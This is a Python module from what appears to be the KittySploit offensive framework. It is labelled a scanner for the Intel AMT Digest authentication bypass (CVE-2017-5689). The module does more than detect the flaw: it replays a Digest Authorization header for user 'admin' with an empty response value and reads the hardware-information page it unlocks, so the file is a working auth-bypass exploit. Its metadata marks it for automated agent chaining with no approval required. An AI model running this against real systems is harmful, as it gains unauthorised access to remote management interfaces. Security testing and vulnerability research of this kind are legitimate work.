#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Intel AMT/ISM empty Digest response auth bypass (CVE-2017-5689)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Intel AMT - Digest Auth Bypass Detection (CVE-2017-5689)',
        'description': (
            'Detects CVE-2017-5689 (INTEL-SA-00075) by replaying Digest Authorization with '
            'empty response and checking access to /index.htm hardware info.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'intel', 'amt', 'auth-bypass', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-5689',
            'https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00075.html',
        ],
        'cve': 'CVE-2017-5689',
    }

    def run(self):
        path = '/index.htm'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        headers = '\n'.join(f'{k}: {v}' for k, v in r.headers.items())
        blob = headers + '\n' + (r.text or '')
        m = re.search(r'"Digest\.?([^"]*)".*?nonce="([^"]+)"', blob, re.I | re.S)
        if not m:
            m = re.search(r'realm="Digest:?([^"]*)".*?nonce="([^"]+)"', blob, re.I | re.S)
        if not m:
            return False
        digest, nonce = m.group(1), m.group(2)
        cnonce = self.random_text(10)
        auth = (
            f'Digest username="admin", realm="Digest:{digest}", nonce="{nonce}", '
            f'uri="{path}", response="", qop=auth, nc=00000001, cnonce="{cnonce}"'
        )
        g = self.http_request(
            method='GET', path=path, headers={'Authorization': auth}, allow_redirects=False,
        )
        if not g or g.status_code != 200:
            return False
        body = g.text or ''
        markers = (
            '>Hardware Information', '>IP address', '>System ID',
            '>System<', '>Processor<', '>Memory<',
        )
        if any(m in body for m in markers):
            self.set_info(
                severity='critical',
                reason='Intel AMT Digest auth bypass (CVE-2017-5689)',
                path=path,
            )
            return True
        return False
